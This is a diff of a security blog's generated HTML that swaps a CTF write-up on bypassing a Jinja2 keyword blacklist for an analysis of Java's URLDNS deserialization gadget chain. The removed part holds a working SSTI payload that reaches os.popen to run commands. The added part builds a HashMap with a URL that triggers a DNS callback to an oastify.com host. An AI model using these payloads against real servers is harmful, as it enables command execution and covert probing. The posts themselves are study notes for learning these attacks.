@@ -78,7 +78,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2026/04/11/jinja2模板下非常见的ssti/"/>
+    <link rel="canonical" href="http://example.com/2026/04/21/java反序列化之urldns链/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -87,16 +87,16 @@
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Jinja2常见关键字被ban后的SSTI">
-<meta property="og:url" content="http://example.com/2026/04/11/Jinja2%E6%A8%A1%E6%9D%BF%E4%B8%8B%E9%9D%9E%E5%B8%B8%E8%A7%81%E7%9A%84SSTI/index.html">
+<meta property="og:title" content="java反序列化之URLDNS链">
+<meta property="og:url" content="http://example.com/2026/04/21/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E9%93%BE/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
-<meta property="article:published_time" content="2026-04-10T16:00:00.000Z">
-<meta property="article:modified_time" content="2026-04-11T09:58:18.549Z">
+<meta property="article:published_time" content="2026-04-20T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-23T12:54:33.818Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="复现笔记">
+<meta property="article:tag" content="java安全">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
     
@@ -110,7 +110,7 @@
     
     <title>
         
-            Jinja2常见关键字被ban后的SSTI | SoloWalker
+            java反序列化之URLDNS链 | SoloWalker
         
     </title>
 
@@ -410,7 +410,7 @@
 		<div class="article-title relative w-full">
 			
 			<div class="w-full flex items-center pt-6 justify-start">
-				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Jinja2常见关键字被ban后的SSTI</h1>
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">java反序列化之URLDNS链</h1>
 			</div>
 			
 		</div>
@@ -431,15 +431,15 @@
 					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2026-04-11</span>
-        <span class="mobile">2026-04-11</span>
+        <span class="desktop">2026-04-21</span>
+        <span class="mobile">2026-04-21</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2026-04-11 17:58:18</span>
-            <span class="mobile">2026-04-11 17:58:18</span>
+            <span class="desktop">2026-04-23 20:54:33</span>
+            <span class="mobile">2026-04-23 20:54:33</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -458,6 +458,16 @@
                     
                     
                 
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/Web%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8/">java安全</a>&nbsp;
+                        </li>
+                    
+                    
+                
             </ul>
         </span>
     
@@ -467,7 +477,7 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/">复现笔记</a>&nbsp;
+                        <a href="/tags/java%E5%AE%89%E5%85%A8/">java安全</a>&nbsp;
                     </li>
                 
             </ul>
@@ -493,39 +503,64 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<h1 id="Jinja2常见关键字被ban后的SSTI"><a href="#Jinja2常见关键字被ban后的SSTI" class="headerlink" title="Jinja2常见关键字被ban后的SSTI"></a>Jinja2常见关键字被ban后的SSTI</h1><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template_string,request,render_template</span><br><span class="line">app=Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">	black_list=[<span class="string">&#x27;__class__&#x27;</span>,<span class="string">&#x27;__init__&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;__&#x27;</span>,<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">	<span class="keyword">if</span> request.method==<span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">		name=request.form.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">		<span class="keyword">for</span> black <span class="keyword">in</span> black_list:</span><br><span class="line">			<span class="keyword">if</span> black <span class="keyword">in</span> name:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">&quot;waf!&quot;</span></span><br><span class="line">		result=render_template_string(name)</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure></div>
+			<h1 id="java反序列化之URLDNS链"><a href="#java反序列化之URLDNS链" class="headerlink" title="java反序列化之URLDNS链"></a>java反序列化之URLDNS链</h1><h2 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h2><p>在 java 中，如果一个对象实现了 Serializable 接口就可以被序列化，java 的这种序列化模式为开发者提供了很多便利，我们可以不必关心具体序列化的过程，只要这个类实现了 Serilizable 接口，这个类的所有属性和方法都会自动序列化，transient 关键字修饰的属性除外，不参与序列化过程。</p>
+<h2 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h2><p>这条利用链有一下特点：</p>
+<ul>
+<li>不限制 jdk 版本，使用 java 内部类，对第三方依赖没用要求</li>
+<li>目标无回显，可以通过 DNS 请求来验证是否存在反序列化漏洞</li>
+<li>URLDNS链只能发起 DNS 请求，并不能进行其他利用。虽然没有任何攻击性，但是在渗透测试的过程中能进行无回显验证</li>
+</ul>
+<p>在 ysoserial 中列出的调用链：</p>
+<div class="code-container" data-rel="Md"><figure class="iseeu highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">*</span>   Gadget Chain:</span><br><span class="line"><span class="bullet"> *</span>     HashMap.readObject()</span><br><span class="line"><span class="bullet"> *</span>       HashMap.putVal()</span><br><span class="line"><span class="bullet"> *</span>         HashMap.hash()</span><br><span class="line"><span class="bullet"> *</span>           URL.hashCode()</span><br></pre></td></tr></table></figure></div>
 
-<p>题目给的源码很简单，只是给了一个黑名单，把常见的SSTI所用的关键字给ban了，但是这里只检查POST请求体name参数是否有非法字符，如果我们把这些敏感字符放在GET参数里面，然后在POST请求体里面用<code>request.args</code>获取GET参数即可绕过。</p>
-<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST: &#123;&#123;(((lipsum|attr(request.args.g))|attr(request.args.gi)(request.args.o))|attr(request.args.p)(request.args.c))|attr(request.args.r)()&#125;&#125;</span><br><span class="line">GET:  g=__globals__&amp;gi=__getitem__&amp;o=os&amp;p=popen&amp;c=命令&amp;r=read</span><br></pre></td></tr></table></figure></div>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><code>java.util.HashMap</code>重写了<code>readObject</code>方法，在反序列化时会调用<code>hash</code>函数计算 key 的 hashCode。而<code>java.net.URL</code>的 hashCode 在计算时会调用<code>getHostAddress</code>来解析域名，从而发出 DNS 请求。</p>
+<p>定位到 HashMap#readObject 方法：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read loadFactor (ignore threshold)</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> fields.get(<span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);</span><br><span class="line">        <span class="keyword">if</span> (lf &lt;= <span class="number">0</span> || Float.isNaN(lf))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> + lf);</span><br><span class="line"></span><br><span class="line">        lf = Math.clamp(lf, <span class="number">0.25f</span>, <span class="number">4.0f</span>);</span><br><span class="line">        HashMap.UnsafeHolder.putLoadFactor(<span class="built_in">this</span>, lf);</span><br><span class="line"></span><br><span class="line">        reinitialize();</span><br><span class="line"></span><br><span class="line">        s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">        <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> + mappings);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// use defaults</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">double</span> <span class="variable">dc</span> <span class="operator">=</span> Math.ceil(mappings / (<span class="type">double</span>)lf);</span><br><span class="line">            <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((dc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                       DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                       (dc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                       MAXIMUM_CAPACITY :</span><br><span class="line">                       tableSizeFor((<span class="type">int</span>)dc));</span><br><span class="line">            <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                         (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">            <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">            SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">            <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">            table = tab;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
 
-<h3 id="payload讲解"><a href="#payload讲解" class="headerlink" title="payload讲解"></a>payload讲解</h3><p><code>lipsum</code>：Jinja2内置的全局函数，是一个python函数对象。</p>
-<p><code>|attr(...)</code>：Jinja2的过滤器，作用相当于<code>getattr(object, attribute_name)</code>，用来获取对象的属性或方法名。</p>
-<p><code>request.args.xxx</code>：从GET参数中取值。</p>
-<h4 id="第一步：获取lipsum的-globals"><a href="#第一步：获取lipsum的-globals" class="headerlink" title="第一步：获取lipsum的__globals__"></a>第一步：获取<code>lipsum</code>的<code>__globals__</code></h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lipsum|attr(request.args.g)</span><br></pre></td></tr></table></figure></div>
+<p>这里我们只需要关注<code>putVal</code>方法，这是一个向 HashMap 中存放键值对的方法，这里调用了<code>hash</code>方法来处理了 key，定位到<code>hash</code>方法：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
 
-<h5 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h5><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="built_in">object</span>|attr(<span class="string">&quot;attribute_name&quot;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure></div>
+<p>可以看到，这里调用了<code>key.hashCode()</code>来计算 key 的哈希值。</p>
+<p><strong>在URLDNS利用链中，我们构造的 HashMap 里放的第一个参数就是一个URL对象，所以把 key 用URL对象替换，即调用URL对象的 hashCode方法。</strong></p>
+<p>样例：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;URL,Integer&gt; hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">hashmap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://sie8dd0dhgeamlivq3kget0i0960uqif.oastify.com&quot;</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure></div>
 
-<p>在jinja2模板中，通常使用<code>.</code>来访问属性，但有局限性：</p>
-<ol>
-<li>不能使用变量作为属性名</li>
-<li>不能访问名称中包含特殊字符的属性</li>
-</ol>
-<p>这样我们就能获取到<code>lipsum</code>函数对象的g属性(g是我们可以控制的，由GET参数决定)。如果我们在GET参数中带上<code>?g=__globals__</code>，我们就能获取<code>lipsum.__globals__</code>这个字典。</p>
-<h4 id="第二步：从-globals-中获取某个成员"><a href="#第二步：从-globals-中获取某个成员" class="headerlink" title="第二步：从__globals__中获取某个成员"></a>第二步：从<code>__globals__</code>中获取某个成员</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lipsum|attr(request.args.g))|attr(request.args.gi)(request.args.o)</span><br></pre></td></tr></table></figure></div>
+<p>定位到 URL#hashCode 方法：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">        hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
 
-<h5 id="语法分解"><a href="#语法分解" class="headerlink" title="语法分解"></a>语法分解</h5><p>第一部分：<code>|attr(request.args.gi)</code></p>
-<p>这是获取<code>lipsum.__globals__</code>返回的字典对象的方法。</p>
-<p>第二部分：<code>(request.args.o)</code></p>
-<p>这是调用这个方法，并传入参数。</p>
-<p>此时如果我们传参：<code>gi=__getitem__&amp;o=os</code>，就能获取到Jinja2内部导入的os模块了。</p>
-<h4 id="第三步：从os模块中获取popen"><a href="#第三步：从os模块中获取popen" class="headerlink" title="第三步：从os模块中获取popen"></a>第三步：从<code>os</code>模块中获取<code>popen</code></h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">( ...上一步结果... )|attr(request.args.p)(request.args.c)</span><br></pre></td></tr></table></figure></div>
+<p>这里的<code>synchronized</code>关键字修饰的方法为同步方法。当<code>synchronized</code>方法执行完或发生异常时，会自动释放锁。</p>
+<p>这里可以看到调用了<code>handler.hashCode(this)</code>，定位到<code>handler</code>：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">transient</span> URLStreamHandler handler;</span><br></pre></td></tr></table></figure></div>
 
-<p>上一步我们获取到os模块之后开始调用os模块的popen函数并执行命令，返回命令执行得到的对象。</p>
-<h4 id="第四步：调用read-读取"><a href="#第四步：调用read-读取" class="headerlink" title="第四步：调用read()读取"></a>第四步：调用<code>read()</code>读取</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">( ...上一步结果... )|attr(request.args.r)()</span><br></pre></td></tr></table></figure></div>
+<p>这是一个<code>URLStreamHandler</code>对象，那我们定位到这个类的<code>hashCode</code>方法：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the protocol part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">        <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">            h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the host part.</span></span><br><span class="line">        <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">        <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">            h += addr.hashCode();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">            <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">                h += host.toLowerCase(Locale.ROOT).hashCode();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the file part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> u.getFile();</span><br><span class="line">        <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">            h += file.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the port part.</span></span><br><span class="line">        <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">            h += getDefaultPort();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            h += u.getPort();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the ref part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ref</span> <span class="operator">=</span> u.getRef();</span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="literal">null</span>)</span><br><span class="line">            h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
 
-<p>此时我们传参<code>c=read</code>即可读取命令执行内容。</p>
-<h2 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h2><p>这里题目源码只给了<code>return &#39;ok&#39;</code>，所以我们可以尝试将flag写入Flask的static目录然后访问该文件来获取flag。</p>
-<p>然后在部分环境内static目录可能不存在，需要先<code>mkdir -p static</code>创建，然后将flag写入文件。</p>
+<p><code>InetAddress addr = getHostAddress(u);</code>这里调用了<code>getHostAddress</code>方法，来看一下是怎么实现的：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hostAddress != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> hostAddress;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (host == <span class="literal">null</span> || host.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            hostAddress = InetAddress.getByName(host);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException | SecurityException ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hostAddress;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><code>getHostAddress()</code>这个方法已经是调用链的最底层了，<code>hostAddress = InetAddress.getByName(host)</code>是唯一出口，它的内部实现最终会调用一个 Native 方法（由c&#x2F;cpp实现的底层系统函数），这个 Native 方法会直接调用操作系统的 Socket API，发起 DNS 请求。</p>
+<p>至此，从正面的分析结束。</p>
+<p>回到最开始的 HashMap#readObject：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">	<span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">	<span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">	<span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">	<span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">	putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到，这里的 key 是从<code>K key = (K) s.readObject();</code>中经过 readObject 得来的，这说明在这之前必定会有 writeObject 方法来进行序列化。定位到 HashMap#writeObject：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">buckets</span> <span class="operator">=</span> capacity();</span><br><span class="line">        <span class="comment">// Write out the threshold, loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultWriteObject();<span class="comment">//这里只是写入hashmap自身的配置参数，并没有攻击性</span></span><br><span class="line">        s.writeInt(buckets);</span><br><span class="line">        s.writeInt(size);</span><br><span class="line">        internalWriteEntries(s);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里调用了<code>internalWriteEntries</code>，定位到它：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">internalWriteEntries</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">       Node&lt;K,V&gt;[] tab;</span><br><span class="line">       <span class="keyword">if</span> (size &gt; <span class="number">0</span> &amp;&amp; (tab = table) != <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">for</span> (Node&lt;K,V&gt; e : tab) &#123;</span><br><span class="line">               <span class="keyword">for</span> (; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">                   s.writeObject(e.key);</span><br><span class="line">                   s.writeObject(e.value);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>
+
